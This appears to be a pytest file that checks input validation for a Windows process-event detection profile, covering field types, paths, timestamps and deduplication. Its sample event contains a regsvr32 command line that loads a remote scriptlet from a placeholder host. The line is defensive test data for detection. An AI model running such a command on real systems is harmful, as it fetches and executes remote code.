"""Boundary checks for the declared flat process-v1 input contract."""
from copy import deepcopy
import json

import pytest

from tools.process_profile import (
    DATASET, MAPPING_PATH, OPTIONAL_FIELDS, PROFILE, REQUIRED_FIELDS, prepare_events,
)


def event():
    return {
        "@timestamp": "2026-01-01T00:00:00Z", "event.id": "event-1",
        "event.dataset": DATASET, "event.code": "1", "host.name": "ws01.example",
        "process.guid": "a1b2c3d4-1111-2222-3333-444455556666",
        "process.parent.guid": "a1b2c3d4-7777-8888-9999-aaaabbbbcccc",
        "process.executable": r"C:\Windows\System32\regsvr32.exe",
        "process.parent.executable": r"C:\Windows\System32\cmd.exe",
        "process.command_line": "regsvr32.exe /s /n /u /i:https://example.invalid/test.sct scrobj.dll",
    }


def test_valid_input_is_not_mutated_and_equivalent_timestamps_deduplicate():
    first = event()
    second = {**first, "@timestamp": "2026-01-01T03:00:00+03:00"}
    original = deepcopy(second)
    events, counts = prepare_events(iter([first, second]))
    assert events == [first]
    assert second == original
    assert counts == {"input_events": 2, "unique_events": 1, "duplicate_events": 1}


def test_command_case_spacing_tabs_and_unicode_nonpredicate_context_are_preserved():
    item = {**event(), "process.command_line": " \tREGSVR32.EXE\t/s  ",
            "host.name": "рабочая.example", "user.name": "LAB\\Оператор"}
    assert prepare_events([item])[0] == [item]


def test_absent_and_explicit_null_optional_context_are_supported():
    item = {**event(), **dict.fromkeys(OPTIONAL_FIELDS)}
    assert prepare_events([item])[0] == [item]
    assert prepare_events([]) == ([], {"input_events": 0, "unique_events": 0, "duplicate_events": 0})


@pytest.mark.parametrize("field", sorted(REQUIRED_FIELDS))
def test_missing_required_source_evidence_fails(field):
    item = event()
    del item[field]
    with pytest.raises(ValueError):
        prepare_events([item])


@pytest.mark.parametrize("field,value", [
    ("event.dataset", "windows.security.logons"), ("event.code", "10"), ("event.code", 1),
    ("host.name", "WS01.example"), ("host.name", " ws01.example"), ("host.name", "-"),
    ("process.guid", "A1B2C3D4-1111-2222-3333-444455556666"),
    ("process.guid", "{a1b2c3d4-1111-2222-3333-444455556666}"),
    ("process.parent.guid", "00000000-0000-0000-0000-000000000000"),
    ("process.guid", 4100), ("process.parent.guid", None),
    ("event.provider", "Microsoft-Windows-Security-Auditing"),
    ("event.channel", "Security"), ("event.version", 4), ("event.version", True),
    ("win.timestamp_remainder", 10), ("win.timestamp_remainder", 1.0),
    ("process.pid", True), ("process.pid", -1), ("process.pid", 2**32),
    ("process.parent.pid", "4000"), ("event.record_id", "01"),
    ("event.record_id", str(2**64)), ("event.record_id", 1),
    ("user.name", "LAB\\bad\nuser"), ("host.name", "bad\ud800host"),
])
def test_invalid_types_noncanonical_identity_and_metadata_are_rejected(field, value):
    with pytest.raises(ValueError):
        prepare_events([{**event(), field: value}])


@pytest.mark.parametrize("field", ["process.executable", "process.parent.executable"])
@pytest.mark.parametrize("value", [
    "regsvr32.exe", r"C:regsvr32.exe", r"\\server\share\regsvr32.exe",
    r"C:\Windows\..\regsvr32.exe", r"C:\Windows\regsvr32.exe:stream",
    r"C:\Windows\NUL.exe", r"C:\Windows\regsvr32.exe.",
    "C:\\Windows\\regſvr32.exe", "C:\\Windows\\regsvr32.exe ",
])
def test_path_aliases_and_unicode_predicate_fields_fail_instead_of_becoming_nonmatches(field, value):
    with pytest.raises(ValueError):
        prepare_events([{**event(), field: value}])


@pytest.mark.parametrize("value", [None, True, 1, "", " \t ", "-", " -\t", "x\n", "x\r",
                                    "x\0", "x\x7f", "powerſhell.exe", "x" * 32767])
def test_invalid_command_text_is_not_silently_trimmed_or_coerced(value):
    with pytest.raises(ValueError):
        prepare_events([{**event(), "process.command_line": value}])


def test_indexed_keyword_and_id_byte_limits():
    item = {**event(), "event.id": "é" * 256, "process.command_line": "x" * 32766,
            "user.name": "é" * 16383}
    assert prepare_events([item])[0] == [item]
    for field, value in (("event.id", "é" * 257), ("user.name", "é" * 16384)):
        with pytest.raises(ValueError):
            prepare_events([{**event(), field: value}])


@pytest.mark.parametrize("field,value", [
    ("process", {"guid": "other"}), ("unexpected", 42),
    ("process.command_line", ["regsvr32.exe"]), ("user.name", {"name": "operator"}),
])
def test_unknown_fields_nested_aliases_and_arrays_fail(field, value):
    with pytest.raises(ValueError):
        prepare_events([{**event(), field: value}])


@pytest.mark.parametrize("timestamp", ["1970-01-01T00:00:00Z", "2262-04-11T23:47:16.854775Z"])
def test_date_nanos_microsecond_endpoints_are_supported(timestamp):
    assert prepare_events([{**event(), "@timestamp": timestamp}])[0][0]["@timestamp"] == timestamp


@pytest.mark.parametrize("timestamp", [
    "1969-12-31T23:59:59.999999Z", "2262-04-11T23:47:16.854776Z",
    "2026-01-01T00:00:00.1234567Z", "2026-01-01T00:00:00", "2026-01-01T00:00:00+01:60",
])
def test_unsupported_timestamp_range_or_precision_fails(timestamp):
    with pytest.raises(ValueError):
        prepare_events([{**event(), "@timestamp": timestamp}])


def test_conflicting_id_fails_even_for_an_obvious_nonmatching_process():
    with pytest.raises(ValueError, match="conflicting duplicate"):
        prepare_events([event(), {**event(), "process.command_line": "notepad.exe"}])
    with pytest.raises(ValueError, match="conflicting duplicate"):
        prepare_events([{**event(), "process.pid": 1}, {**event(), "process.pid": True}])


def test_mapping_covers_flat_contract_without_text_analysis_or_numeric_coercion():
    mapping = json.loads(MAPPING_PATH.read_text())["mappings"]
    assert mapping["_meta"]["profile"] == PROFILE
    leaves = {}

    def collect(properties, prefix=""):
        for key, spec in properties.items():
            path = prefix + key
            if "properties" in spec:
                collect(spec["properties"], path + ".")
            else:
                leaves[path] = spec

    collect(mapping["properties"])
    assert set(leaves) == REQUIRED_FIELDS | OPTIONAL_FIELDS
    assert leaves["@timestamp"]["type"] == "date_nanos"
    for field in ("process.executable", "process.parent.executable", "process.command_line"):
        assert leaves[field] == {"type": "keyword"}
    for field in ("process.pid", "process.parent.pid", "event.version", "win.timestamp_remainder"):
        assert leaves[field]["coerce"] is False
